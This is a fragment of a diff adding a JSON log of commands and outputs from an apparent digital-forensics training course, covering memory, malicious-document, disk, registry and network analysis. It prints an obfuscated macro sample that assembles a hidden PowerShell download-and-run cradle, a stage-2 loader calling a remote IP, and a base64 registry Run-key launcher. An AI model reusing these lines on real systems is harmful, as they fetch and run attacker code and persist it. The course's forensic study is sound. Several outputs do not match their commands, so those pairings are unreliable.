+   "doc": "3716  WinRAR.exe   \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\Jaffa\\Desktop\\pr0t3ct3d\\flag.rar\"\n4084  DumpIt.exe   \"C:\\Users\\Jaffa\\Desktop\\DumpIt.exe\"\n880   cmd.exe      \"C:\\Windows\\system32\\cmd.exe\"\n2124  chrome.exe   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"\n"
+  },
+  {
+   "n": 11,
+   "cmd": "vol -q -f Challenge.raw windows.dlllist --pid 3716",
+   "doc": "3716  WinRAR.exe  WinRAR.exe     C:\\Program Files\\WinRAR\\WinRAR.exe\n3716  WinRAR.exe  ntdll.dll      C:\\Windows\\SYSTEM32\\ntdll.dll\n3716  WinRAR.exe  kernel32.dll   C:\\Windows\\system32\\kernel32.dll\n3716  WinRAR.exe  USER32.dll     C:\\Windows\\system32\\USER32.dll\n3716  WinRAR.exe  COMCTL32.dll   C:\\Windows\\WinSxS\\...common-controls...\\COMCTL32.dll\n"
+  },
+  {
+   "n": 12,
+   "cmd": "vol -q -f Challenge.raw windows.handles --pid 3716",
+   "doc": "3716  WinRAR.exe  File    \\Device\\HarddiskVolume2\\Users\\Jaffa\\Desktop\\pr0t3ct3d\n3716  WinRAR.exe  Key     MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\APPCOMPATFLAGS\n3716  WinRAR.exe  Mutant  -\n"
+  },
+  {
+   "n": 13,
+   "cmd": "vol -q -f Challenge.raw windows.malfind",
+   "doc": "1944  explorer.exe   0x4320000  VadS  PAGE_EXECUTE_READWRITE\n  41 ba 80 00 00 00 48 b8 38 a1 86 ff fe 07 00 00   A.....H.8.......\n  48 ff 20 90 41 ba 81 00 00 00 48 b8 38 a1 86 ff   H. .A.....H.8...\n1944  explorer.exe   0x3ce0000  VadS  PAGE_EXECUTE_READWRITE  (all 00 bytes)\n2124  chrome.exe     0x4830000  VadS  PAGE_EXECUTE_READWRITE  (all 00 bytes)\n2292  WmiPrvSE.exe   0x1bd0000  VadS  PAGE_EXECUTE_READWRITE\n"
+  },
+  {
+   "n": 14,
+   "cmd": "vol -q -f Challenge.raw windows.netscan",
+   "doc": "Proto  LocalAddr   LPort  ForeignAddr      FPort  State        PID   Owner\nTCPv4  10.0.2.15   49235  172.217.194.189  443    ESTABLISHED  2080  firefox.exe\nTCPv4  10.0.2.15   49232  172.217.160.131  80     ESTABLISHED  2080  firefox.exe\nTCPv4  10.0.2.15   49198  216.58.197.67    443    ESTABLISHED  2080  firefox.exe\nTCPv4  127.0.0.1   49170  127.0.0.1        49171  ESTABLISHED  2968  firefox.exe\nTCPv4  0.0.0.0     445    0.0.0.0          0      LISTENING    4     System\nTCPv4  0.0.0.0     135    0.0.0.0          0      LISTENING    480   services.exe\nUDPv4  0.0.0.0     5353   *                0                   2124  chrome.exe\n"
+  },
+  {
+   "n": 15,
+   "cmd": "vol -q -f Challenge.raw windows.netstat",
+   "doc": "ERROR  volatility3.plugins.windows.netstat: Unable to locate symbols for the memory image's tcpip module\n"
+  },
+  {
+   "n": 16,
+   "cmd": "vol -q -f Challenge.raw windows.svcscan",
+   "doc": null
+  },
+  {
+   "n": 17,
+   "cmd": "vol -q -f Challenge.raw windows.svcscan | grep -Ei 'Users|Temp|AppData|ProgramData'   # -> no rows",
+   "doc": null
+  },
+  {
+   "n": 18,
+   "cmd": "mkdir -p dump",
+   "doc": null
+  },
+  {
+   "n": 19,
+   "cmd": "vol -q -o dump -f Challenge.raw windows.pslist --pid 3716 --dump",
+   "doc": "3716  1944  WinRAR.exe  ...  3716.WinRAR.exe.0x13fdf0000-1.dmp\n"
+  }
+ ],
+ "module-14-malicious-documents": [
+  {
+   "n": 1,
+   "cmd": "cd module-14-malicious-documents/data/artifacts",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "ls -1",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "cat 01_oleid_invoice.txt",
+   "doc": "VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA\n                    |                    |          |macros. Suspicious\n                    |                    |          |keywords were found. Use\n                    |                    |          |olevba and mraptor for\n                    |                    |          |more info.\n"
+  },
+  {
+   "n": 4,
+   "cmd": "grep -iE 'VBA Macros|HIGH|Encrypted|External' 01_oleid_invoice.txt",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "cat 02_mraptor_invoice.txt",
+   "doc": "SUSPICIOUS|AWX  |OLE:|Invoice_2024_0042.doc\nFlags: A=AutoExec, W=Write, X=Execute\nExit code: 20 - SUSPICIOUS\n"
+  },
+  {
+   "n": 6,
+   "cmd": "cat 03_olevba_analysis_invoice.txt",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "grep -iE 'AutoExec|Suspicious|IOC' 03_olevba_analysis_invoice.txt",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "grep -iE 'AutoOpen|Document_Open|Shell|WScript|URLDownload|Chr\\(|StrReverse|http' invoice.macro.vba",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "awk '/^Sub InitDocument/,/^End Sub/' invoice.macro.vba",
+   "doc": "Sub InitDocument()\n    ' \"powershell\" assembled from character codes (string obfuscation)\n    app = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _\n          Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\n    host = \"http://www\" & \".\" & \"example\" & \".\" & \"test/inv/update.ps1\"\n    dest = Environ(\"TEMP\") & \"\\svchost_update.ps1\"\n    flags = StrReverse(\"ssapyb pe neddih w- pon-\")   ' -> -nop -w hidden ep bypass\n    payload = app & \" \" & flags & \" -c \"\"IEX (New-Object \" & _\n        \"Net.WebClient).DownloadString('\" & host & \"')\"\"\"\n    Shell payload, vbHide                             ' execution path 1\n    CreateObject(\"WScript.Shell\").Run payload, 0, False   ' execution path 2\n    URLDownloadToFileA 0, host, dest, 0, 0            ' backup: drop to %TEMP%\n    CreateObject(\"WScript.Shell\").Run \"wscript \" & dest, 0, False\nEnd Sub\n"
+  },
+  {
+   "n": 10,
+   "cmd": "python3 -c \"import re",
+   "doc": null
+  },
+  {
+   "n": 11,
+   "cmd": "q=chr(34); a=chr(39)",
+   "doc": null
+  },
+  {
+   "n": 12,
+   "cmd": "t=open('invoice.macro.vba',encoding='utf-8',errors='replace').read()",
+   "doc": null
+  },
+  {
+   "n": 13,
+   "cmd": "app=''.join(chr(int(c)) for c in re.findall(r'Chr.(\\d+).', t))",
+   "doc": null
+  },
+  {
+   "n": 14,
+   "cmd": "flags=re.search(r'StrReverse.\\\"([^\\\"]*)\\\".', t).group(1)[::-1]",
+   "doc": null
+  },
+  {
+   "n": 15,
+   "cmd": "host=''.join(re.findall(r'\\\"([^\\\"]*)\\\"', re.search(r'host = (.+)', t).group(1)))",
+   "doc": null
+  },
+  {
+   "n": 16,
+   "cmd": "print('powershell (from Chr codes):', app)",
+   "doc": null
+  },
+  {
+   "n": 17,
+   "cmd": "print('flags (from StrReverse)    :', flags)",
+   "doc": null
+  },
+  {
+   "n": 18,
+   "cmd": "print('staging URL                :', host)",
+   "doc": null
+  },
+  {
+   "n": 19,
+   "cmd": "print('reconstructed command      :', app+' '+flags+' -c '+q+'IEX (New-Object Net.WebClient).DownloadString('+a+host+a+')'+q)\"",
+   "doc": "powershell (from Chr codes): powershell\nflags (from StrReverse)    : -nop -w hidden ep bypass\nstaging URL                : http://www.example.test/inv/update.ps1\nreconstructed command      : powershell -nop -w hidden ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://www.example.test/inv/update.ps1')\"\n"
+  },
+  {
+   "n": 20,
+   "cmd": "grep -iE \"app = |host = |flags = |DownloadString\" 04_olevba_reveal_invoice.txt",
+   "doc": "    app = \"powershell\"\n    host = \"http://www.example.test/inv/update.ps1\"\n    flags = \"-nop -w hidden ep bypass\"\n    payload = app & \" \" & flags & \" -c \"\"IEX (New-Object Net.WebClient).DownloadString('\" & host & \"')\"\"\"\n"
+  },
+  {
+   "n": 21,
+   "cmd": "cat 05_oledump_invoice.txt",
+   "doc": "  1:        96 'PROJECT'\n  2:        18 'PROJECTwm'\n  3: M    5066 'VBA/Module1'\n  4:        40 'VBA/_VBA_PROJECT'\n  5:       272 'VBA/dir'\n"
+  },
+  {
+   "n": 22,
+   "cmd": "grep -iE 'Chr\\(|StrReverse|host =|Shell|URLDownload' 06_oledump_macro_invoice.txt",
+   "doc": null
+  },
+  {
+   "n": 23,
+   "cmd": "cat 07_oledump_http_invoice.txt",
+   "doc": "  3: M    5066 'VBA/Module1'\n               Plugin: HTTP Heuristics plugin\n                 http://www\n"
+  },
+  {
+   "n": 24,
+   "cmd": "cat 08_zipdump_statement.txt",
+   "doc": "Index Filename                     Encrypted Timestamp\n    1 [Content_Types].xml                  0 2024-11-04 09:00:00\n    2 _rels/.rels                          0 2024-11-04 09:00:00\n    3 word/document.xml                    0 2024-11-04 09:00:00\n    4 word/_rels/document.xml.rels         0 2024-11-04 09:00:00\n    5 word/vbaProject.bin                  0 2024-11-04 09:00:00\n"
+  },
+  {
+   "n": 25,
+   "cmd": "cat 09_statement_vbaproject_streams.txt",
+   "doc": "  3: M    5066 'VBA/Module1'\n"
+  },
+  {
+   "n": 26,
+   "cmd": "diff 06_oledump_macro_invoice.txt 10_statement_macro.txt && echo \"IDENTICAL \u2014 same VBA project in both containers\"",
+   "doc": null
+  },
+  {
+   "n": 27,
+   "cmd": "cat 11_pdfid_invoice.txt",
+   "doc": "PDFiD 0.2.10 Invoice_2024_0042.pdf\n obj                    8\n /Page                  1\n /JS                    2\n /JavaScript            3\n /AA                    1\n /OpenAction            1\n /Launch                1\n"
+  },
+  {
+   "n": 28,
+   "cmd": "grep -iE 'JavaScript|OpenAction|Launch|/JS|/AA' 11_pdfid_invoice.txt",
+   "doc": null
+  },
+  {
+   "n": 29,
+   "cmd": "cat 12_pdf_openaction.txt",
+   "doc": "obj 1 0\n Type: /Catalog\n    /OpenAction 4 0 R\n    /Names << /JavaScript << /Names [ (AcmeBoot) 7 0 R ] >> >>\n"
+  },
+  {
+   "n": 30,
+   "cmd": "cat 13_pdf_obj4.txt",
+   "doc": "obj 4 0\n Type: /Action\n  << /Type /Action /S /JavaScript /JS 5 0 R >>\n"
+  },
+  {
+   "n": 31,
+   "cmd": "cat 14_pdf_obj5_js.txt",
+   "doc": "obj 5 0\n Contains stream\n  << /Length 194 /Filter /FlateDecode >>\n b'// Acme Secure Reader bootstrap\\n\n   app.alert({cMsg: \"This document is protected. Click OK to view it.\", ...});\\n\n   var trackUrl = \"http://www.example.test/track?doc=INV-2024-0042\";\\n\n   app.launchURL(trackUrl, true);\\n'\n"
+  },
+  {
+   "n": 32,
+   "cmd": "grep -oiE 'app\\.(alert|launchURL)|http://[^\"]+' 14_pdf_obj5_js.txt",
+   "doc": null
+  },
+  {
+   "n": 33,
+   "cmd": "cat 15_pdf_launch.txt",
+   "doc": "obj 8 0\n Type: /Action\n  << /Type /Action /S /Launch\n     /Win << /F (calc.exe) /D (C:\\Windows\\System32) /P () >> >>\n"
+  },
+  {
+   "n": 34,
+   "cmd": "grep -iE 'launchURL|calc\\.exe|/Launch|/OpenAction' 12_pdf_openaction.txt 14_pdf_obj5_js.txt 15_pdf_launch.txt",
+   "doc": null
+  }
+ ],
+ "module-15-filesystem-timeline": [
+  {
+   "n": 1,
+   "cmd": "cd module-15-filesystem-timeline/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "mmls disk-DESKTOP-SDN1RPT.raw",
+   "doc": "DOS Partition Table\nOffset Sector: 0\nUnits are in 512-byte sectors\n\n      Slot      Start        End          Length       Description\n000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)\n001:  -------   0000000000   0000002047   0000002048   Unallocated\n002:  000:000   0000002048   0000020479   0000018432   NTFS / exFAT (0x07)\n"
+  },
+  {
+   "n": 3,
+   "cmd": "fls -o 2048 -r -p disk-DESKTOP-SDN1RPT.raw",
+   "doc": "d/d 68-144-2:\tUsers/mortysmith\n-/r * 80-128-2:\tUsers/mortysmith/AppData/Local/Temp/update.ps1\nr/r 78-128-2:\tUsers/mortysmith/Desktop/notes.txt\nr/r 77-128-2:\tUsers/mortysmith/Documents/Q3_recipes.xlsx\n-/r * 81-128-2:\tUsers/mortysmith/Downloads/loot.zip\nr/r 76-128-2:\tWindows/System32/cmd.exe\nr/r 75-128-2:\tWindows/System32/win32k.sys\nr/r 79-128-2:\tWindows/Temp/coreupdater.exe\n"
+  },
+  {
+   "n": 4,
+   "cmd": "fls -o 2048 -r -d -p disk-DESKTOP-SDN1RPT.raw",
+   "doc": "-/r * 80-128-2:\tUsers/mortysmith/AppData/Local/Temp/update.ps1\n-/r * 81-128-2:\tUsers/mortysmith/Downloads/loot.zip\n-/r * 16:\t$OrphanFiles/OrphanFile-16\n... (OrphanFile-17 \u2026 23)\n"
+  },
+  {
+   "n": 5,
+   "cmd": "icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 80",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 > recovered_loot.zip",
+   "doc": "IEX (New-Object Net.WebClient).DownloadString('http://45.77.13.37/c2.ps1')  # stage-2 loader\n"
+  },
+  {
+   "n": 7,
+   "cmd": "istat -o 2048 disk-DESKTOP-SDN1RPT.raw 79",
+   "doc": "$STANDARD_INFORMATION Attribute Values:\nCreated:\t2019-03-15 12:00:00.000000000 (UTC)\nFile Modified:\t2019-03-15 12:00:00.000000000 (UTC)\nMFT Modified:\t2026-06-29 19:08:09.267375500 (UTC)\nAccessed:\t2019-03-15 12:00:00.000000000 (UTC)\n\n$FILE_NAME Attribute Values:\nName: coreupdater.exe\nCreated:\t2026-06-15 09:12:33.456789000 (UTC)\nFile Modified:\t2026-06-15 09:12:33.456789000 (UTC)\nMFT Modified:\t2026-06-15 09:12:33.512004400 (UTC)\nAccessed:\t2026-06-15 09:12:34.001022200 (UTC)\n"
+  },
+  {
+   "n": 8,
+   "cmd": "istat -o 2048 disk-DESKTOP-SDN1RPT.raw 75",
+   "doc": "$STANDARD_INFORMATION Attribute Values:\nCreated:\t2019-03-15 08:34:21.765432100 (UTC)\n...\n$FILE_NAME Attribute Values:\nCreated:\t2019-03-15 08:34:21.765432100 (UTC)\n"
+  },
+  {
+   "n": 9,
+   "cmd": "icat -o 2048 disk-DESKTOP-SDN1RPT.raw 0 > MFT",
+   "doc": null
+  },
+  {
+   "n": 10,
+   "cmd": "MFTECmd -f MFT --csv . --csvf mft.csv",
+   "doc": "MFT: FILE records found: 35 (Free records: 47) File size: 82KB\n\tCSV output will be saved to ./mft.csv\n"
+  },
+  {
+   "n": 11,
+   "cmd": "fls -o 2048 -r -m C: disk-DESKTOP-SDN1RPT.raw > fls.body",
+   "doc": null
+  },
+  {
+   "n": 12,
+   "cmd": "mactime -b fls.body -d -z UTC > timeline.csv",
+   "doc": "Fri Mar 15 2019 12:00:00 , 77 , ma.b , r/r... , 79-128-2 , \"C:/Windows/Temp/coreupdater.exe\"\nMon Jun 15 2026 09:10:05 , 93 , ma.b , -/r... , 80-128-2 , \"C:/Users/mortysmith/AppData/Local/Temp/update.ps1 (deleted)\"\nMon Jun 15 2026 09:12:33 , 96 , m.cb , r/r... , 79-48-3  , \"C:/Windows/Temp/coreupdater.exe ($FILE_NAME)\"\nMon Jun 15 2026 09:20:15 , 12984 , .a.b , -/r... , 81-128-2 , \"C:/Users/mortysmith/Downloads/loot.zip (deleted)\"\n"
+  },
+  {
+   "n": 13,
+   "cmd": "MFTECmd -f MFT --body . --bodyf mft.body --bdl C",
+   "doc": null
+  },
+  {
+   "n": 14,
+   "cmd": "mactime -b mft.body -d -z UTC > timeline_mft.csv",
+   "doc": null
+  },
+  {
+   "n": 15,
+   "cmd": "MFTECmd -f UsnJrnl_J --csv . --csvf usnjrnl.csv",
+   "doc": null
+  },
+  {
+   "n": 16,
+   "cmd": "cut -d, -f1,9,10 usnjrnl.csv",
+   "doc": "cu.tmp           \u202637.6148492   FileCreate            <- payload staged under an innocuous temp name\ncu.tmp           \u202637.6293930   RenameOldName         <- ...then renamed\ncoreupdater.exe  \u202637.6293930   RenameNewName         <- ...into place  (RENAME = this pair)\ncoreupdater.exe  \u202637.6433303   DataExtend            <- payload bytes written\nupdate.ps1       \u202637.6458383   FileCreate            <- second-stage script dropped\nloot.zip         \u202637.6458383   FileCreate            <- collection archive dropped\ncoreupdater.exe  \u202637.9843261   BasicInfoChange       <- the TIMESTOMP (metadata rewrite)\nupdate.ps1       \u202638.3119259   FileDelete|Close      <- cleanup\nloot.zip         \u202638.3119259   FileDelete|Close      <- cleanup\n"
+  }
+ ],
+ "module-16-registry-regripper": [
+  {
+   "n": 1,
+   "cmd": "cd module-16-registry-regripper/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "rip -l | head",
+   "doc": "rip -r <hive file> -p <plugin>\n"
+  },
+  {
+   "n": 3,
+   "cmd": "rip -r SYSTEM -p compname",
+   "doc": "ComputerName    = CITADEL-DC01\nTCP/IP Hostname = CITADEL-DC01\n"
+  },
+  {
+   "n": 4,
+   "cmd": "rip -r SYSTEM -p timezone",
+   "doc": "TimeZoneInformation key\nControlSet001\\Control\\TimeZoneInformation\nLastWrite Time 2020-09-17 17:56:13Z\n  Bias            -> 480 (8 hours)\n  TimeZoneKeyName -> Pacific Standard Time\n"
+  },
+  {
+   "n": 5,
+   "cmd": "rip -r SYSTEM -p services",
+   "doc": "Sat Sep 19 03:27:49 2020 Z\n  Name      = coreupdater\n  Display   =\n  ImagePath = C:\\Windows\\System32\\coreupdater.exe\n  Type      = Own_Process\n  Start     = Auto Start\n  Group     =\n\nSat Sep 19 03:21:47 2020 Z\n  Name      = terminpt\n  Display   = @termmou.inf,%TermInpt.SVCDESC%;Microsoft Remote Desktop Input Driver\n  ImagePath = \\SystemRoot\\System32\\drivers\\terminpt.sys\n"
+  },
+  {
+   "n": 6,
+   "cmd": "rip -r SYSTEM -p usbstor",
+   "doc": "ControlSet001\\Enum\\USBStor not found.\n"
+  },
+  {
+   "n": 7,
+   "cmd": "rip -r SYSTEM -p usb",
+   "doc": null
+  },
+  {
+   "n": 8,
+   "cmd": "rip -r SYSTEM -p mountdev",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "rip -r SYSTEM -p shutdown",
+   "doc": "ShutdownTime  : 2020-09-18 23:10:53Z\n"
+  },
+  {
+   "n": 10,
+   "cmd": "rip -r SAM -p samparse",
+   "doc": "Username        : Administrator [500]\n  Account Created : Thu Sep 17 17:57:10 2020 Z\n  Login Count     : 0\nUsername        : Guest [501]   --> Account Disabled\n\nGroup : Administrators [2]\n  S-1-5-21-2620694702-3641965580-775306395-500   (built-in Administrator)\n  S-1-5-21-2232410529-1445159330-2725690660-512   (a domain group)\n"
+  },
+  {
+   "n": 11,
+   "cmd": "rip -r SOFTWARE -p run",
+   "doc": "Microsoft\\Windows\\CurrentVersion\\Run\nLastWrite Time 2020-09-19 03:30:01Z\n  VMware VM3DService Process - \"C:\\Windows\\system32\\vm3dservice.exe\" -u\n  coreupdate - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c\n       \"iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\n        (Get-Item 'HKLM:Software\\9sEoCawv').GetValue('45SVAG2o'))))\"\n  VMware User Process - \"...\\vmtoolsd.exe\" -n vmusr\n"
+  },
+  {
+   "n": 12,
+   "cmd": "rip -r SOFTWARE -p uninstall",
+   "doc": "2020-09-17 17:56:12Z\n  VMware Tools v.11.0.6.15940789\n  Microsoft Visual C++ 2019 X64 ...\n"
+  },
+  {
+   "n": 13,
+   "cmd": "rip -r SOFTWARE -p networklist",
+   "doc": "C137.local\n  DateLastConnected: 2020-09-17 22:10:45\n  DateCreated      : 2020-09-17 17:43:29\n  DefaultGatewayMac: 00-0C-29-95-CD-21\n  Type             : wired\n"
+  },
+  {
+   "n": 14,
+   "cmd": "rip -r NTUSER.DAT -p recentdocs",
+   "doc": "RecentDocs   LastWrite Time: 2020-09-18 23:07:44Z\n  5 = Portal_gun.png\n  4 = Pictures\n  3 = Jessica.jpg\n  2 = My Social Security Number.txt\n  1 = Plans.txt\n  0 = Thoughts.txt\n"
+  },
+  {
+   "n": 15,
+   "cmd": "rip -r NTUSER.DAT -p userassist     # GUI programs mortysmith ran: notepad, calc, mspaint, Snipping Tool",
+   "doc": null
+  },
+  {
+   "n": 16,
+   "cmd": "rip -r NTUSER.DAT -p run            # mortysmith's per-user autostart: just OneDrive (benign)",
+   "doc": null
+  },
+  {
+   "n": 17,
+   "cmd": "rip -r UsrClass.dat -p shellbags",
+   "doc": "MRU Time             | Resource\n2020-09-18 23:07:39  | My Computer\\{d3162b92-...} [Desktop\\1\\0\\]\n                     | My Games [Desktop\\0\\]\n"
+  },
+  {
+   "n": 18,
+   "cmd": "rip -r Administrator_NTUSER.DAT -p userassist",
+   "doc": "2020-09-19 03:41:06Z\n  {1AC14E77-...}\\cmd.exe (1)\n2020-09-19 03:40:49Z\n  {1AC14E77-...}\\coreupdater.exe (1)\n2020-09-19 03:39:02Z\n  Microsoft.MicrosoftEdge ... (1)\n"
+  }
+ ],
+ "module-17-user-activity": [
+  {
+   "n": 1,
+   "cmd": "cd module-17-user-activity/data",
+   "doc": "%AppData%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*.automaticDestinations-ms\n%AppData%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*.customDestinations-ms\n"
+  },
+  {
+   "n": 2,
+   "cmd": "JLECmd.exe -d artifacts --csv out --csvf jumplists.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "head -1 out/jumplists_AutomaticDestinations.csv          # see the column headers",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "grep -i -E \"\\.exe|\\.docx|\\\\\\\\\" out/jumplists_AutomaticDestinations.csv   # opened binaries, docs, UNC paths",
+   "doc": "%AppData%\\Microsoft\\Windows\\Recent\\*.lnk          (auto-created \"Recent Items\")\n%AppData%\\Microsoft\\Windows\\Start Menu\\\u2026\\*.lnk    (Start-menu / pinned shortcuts)\nC:\\Users\\<user>\\Desktop\\*.lnk\n"
+  },
+  {
+   "n": 5,
+   "cmd": "LECmd.exe -d artifacts --csv out --csvf lnk.csv",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "grep -i \"Removable\" out/lnk.csv        # anything opened off external media",
+   "doc": null
+  },
+  {
+   "n": 7,
+   "cmd": "head -1 out/lnk.csv                     # inspect the full column list",
+   "doc": "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat   (BagMRU \u2014 the main shellbag store)\nC:\\Users\\<user>\\NTUSER.DAT                                     (older/secondary shellbag keys)\n"
+  },
+  {
+   "n": 8,
+   "cmd": "SBECmd.exe -d artifacts --csv out",
+   "doc": null
+  },
+  {
+   "n": 9,
+   "cmd": "grep -i -E \"Removable|\\\\\\\\\\\\\\\\|USB\" out/*.csv   # external drives + UNC shares in the bags",
+   "doc": "C:\\$Recycle.Bin\\<user-SID>\\$I******      (metadata: original path, size, deleted-on)\nC:\\$Recycle.Bin\\<user-SID>\\$R******      (the recovered file data)\n"
+  },
+  {
+   "n": 10,
+   "cmd": "RBCmd.exe -d 'artifacts/recyclebin' --csv out --csvf recyclebin.csv    # recurse a $Recycle.Bin tree",
+   "doc": null
+  },
+  {
+   "n": 11,
+   "cmd": "RBCmd.exe -f 'artifacts/$IAB12CD.docx' --csv out                        # or one $I record",
+   "doc": null
+  }
+ ],
+ "module-18-super-timeline": [
+  {
+   "n": 1,
+   "cmd": "cd module-18-super-timeline/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "MFTECmd -f evidence/MFT --csv out --csvf mft.csv",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "EvtxECmd -d evidence --csv out --csvf evtx.csv",
+   "doc": "MFTECmd:   FILE records found: 35 (Free records: 47)   ->  out/mft.csv\nEvtxECmd:  Processed 36 files, 547 event records        ->  out/evtx.csv\n"
+  },
+  {
+   "n": 4,
+   "cmd": "python3 merge_timeline.py out",
+   "doc": "merged super-timeline: 582 events -> out/super_timeline.csv\n  span: 2019-03-15 08:34:19  ..  2026-06-29 20:14:07\n"
+  },
+  {
+   "n": 5,
+   "cmd": "head -1 out/super_timeline.csv",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "grep -i coreupdater out/super_timeline.csv",
+   "doc": "Time,Source,Description\n2019-03-15 12:00:00.0000000,MFT,coreupdater.exe\n"
+  }
+ ],
+ "module-19-browser-forensics": [
+  {
+   "n": 1,
+   "cmd": "cd module-19-browser-forensics/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "ls profile/",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "hindsight -i profile -o browser -f jsonl",
+   "doc": null
+  },
+  {
+   "n": 4,
+   "cmd": "wc -l browser.jsonl",
+   "doc": null
+  },
+  {
+   "n": 5,
+   "cmd": "python3 -c \"import json; rows=[json.loads(l) for l in open('browser.jsonl')]; from collections import Counter; c=Counter(r.get('source_long') for r in rows); print(c); [print(' -', r.get('url','')[:70]) for r in rows if r.get('url')][:5]\"",
+   "doc": null
+  },
+  {
+   "n": 6,
+   "cmd": "grep -i wikipedia browser.jsonl | head -1",
+   "doc": null
+  }
+ ],
+ "module-20-triage-velociraptor": [
+  {
+   "n": 1,
+   "cmd": "cd module-20-triage-velociraptor",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "velociraptor -v query \"SELECT Name, Pid, Ppid, CommandLine FROM pslist() LIMIT 15\"",
+   "doc": "{\"Name\":\"System\",\"Pid\":4,\"Ppid\":0,\"CommandLine\":null}\n{\"Name\":\"services.exe\",\"Pid\":712,\"Ppid\":628,\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\services.exe\"}\n{\"Name\":\"svchost.exe\",\"Pid\":1044,\"Ppid\":712,\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k RPCSS -p\"}\n{\"Name\":\"explorer.exe\",\"Pid\":3820,\"Ppid\":3760,\"CommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\"}\n{\"Name\":\"powershell.exe\",\"Pid\":5120,\"Ppid\":3820,\"CommandLine\":\"powershell.exe\"}\n"
+  },
+  {
+   "n": 3,
+   "cmd": "velociraptor -v query \"SELECT Name, CommandLine FROM pslist() WHERE Name =~ 'svchost' LIMIT 5\"",
+   "doc": "{\"Name\":\"svchost.exe\",\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch -p\"}\n{\"Name\":\"svchost.exe\",\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k RPCSS -p\"}\n{\"Name\":\"svchost.exe\",\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p\"}\n{\"Name\":\"svchost.exe\",\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\svchost.exe -k LocalServiceNetworkRestricted -p\"}\n"
+  },
+  {
+   "n": 4,
+   "cmd": "velociraptor artifacts collect Windows.Forensics.Prefetch --output collection.zip",
+   "doc": "[INFO] Collecting artifact Windows.Forensics.Prefetch\n[INFO] Uploaded results to container collection.zip\nCollection complete. 1 artifact, results written to collection.zip\n"
+  },
+  {
+   "n": 5,
+   "cmd": "unzip -l collection.zip",
+   "doc": "Archive:  collection.zip\n  Length      Name\n---------  ----------------------------------------\n  3014221   results/Windows.Forensics.Prefetch.json\n     1876   collection_context.json\n     4402   log.json\n---------\n  3020499   3 files\n"
+  }
+ ],
+ "module-21-network-forensics": [
+  {
+   "n": 1,
+   "cmd": "cd module-21-network-forensics/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "tshark -r capture.pcap -q -z io,phs",
+   "doc": "tshark -r capture.pcap -q -z io,phs\n"
+  },
+  {
+   "n": 3,
+   "cmd": "tshark -r capture.pcap -Y http.request -T fields -e ip.dst -e http.host -e http.request.uri",
+   "doc": "93.184.216.34\texample.com\t/\n"
+  },
+  {
+   "n": 4,
+   "cmd": "tshark -r capture.pcap -Y dns -T fields -e dns.qry.name",
+   "doc": "example.com\nexample.com\nkq3v9x7zpl2m8w.example.org\n"
+  },
+  {
+   "n": 5,
+   "cmd": "tshark -r capture.pcap -q -z conv,tcp",
+   "doc": "TCP Conversations\n                                                           |       <-      | |       ->      | |     Total     |\n10.0.0.50:52000            <-> 93.184.216.34:80                 2 184 bytes       3 221 bytes       5 405 bytes\n"
+  },
+  {
+   "n": 6,
+   "cmd": "tshark -r capture.pcap -Y 'http.response' -T fields -e http.response.code -e http.content_type",
+   "doc": "200\ttext/html\n"
+  }
+ ],
+ "module-22-detection-engineering": [
+  {
+   "n": 1,
+   "cmd": "cd module-22-detection-engineering/data",
+   "doc": null
+  },
+  {
+   "n": 2,
+   "cmd": "cat rules/new_service.yml",
+   "doc": null
+  },
+  {
+   "n": 3,
+   "cmd": "sigma check rules/new_service.yml",
+   "doc": "No validation issues found.\n"
+  },
+  {
+   "n": 4,
+   "cmd": "sigma convert -t sqlite rules/new_service.yml",
+   "doc": "SELECT * FROM logs WHERE EventID=7045\n"
+  },
+  {
+   "n": 5,
+   "cmd": "zircolite --evtx evtx -r rules -c fieldMappings.yaml -o detect.json",
+   "doc": "Matched 3 events across 1 rules\nCoverage 1/2 rules matched (50.0%)\n"
+  },
+  {
+   "n": 6,
